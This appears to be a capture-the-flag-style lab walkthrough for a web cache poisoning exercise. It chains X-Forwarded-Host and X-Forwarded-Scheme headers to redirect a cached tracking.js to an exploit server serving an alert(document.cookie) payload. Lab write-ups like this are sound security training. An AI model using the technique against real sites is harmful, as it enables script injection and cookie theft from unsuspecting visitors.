Solution Steps:

1. Load the home page with Burp Suite running.
2. Find the GET /resources/js/tracking.js request in Proxy → HTTP history and send it to Repeater.
3. Add a cache-buster parameter and:
   X-Forwarded-Host: example.com
   (No effect.)
4. Remove X-Forwarded-Host and add:
   X-Forwarded-Scheme: nothttps
   Confirm the response is 302.
5. Add back:
   X-Forwarded-Host: example.com
   X-Forwarded-Scheme: nothttps
   Verify the Location header points to:
   https://example.com/
6. On the Exploit Server, create:
   /resources/js/tracking.js
7. Add the payload:
   alert(document.cookie)
   and store the exploit.
8. Change the header to:
   X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   while keeping:
   X-Forwarded-Scheme: nothttps
9. Send the request until the exploit server URL is reflected and the response contains:
   X-Cache: hit
10. Copy the request URL and open it in Burp's browser to verify the poisoned response contains the payload.
11. Remove the cache-buster and resend the request to poison the cache again.
12. Reload the home page and keep replaying the request until the victim visits the poisoned cache and the lab is solved.
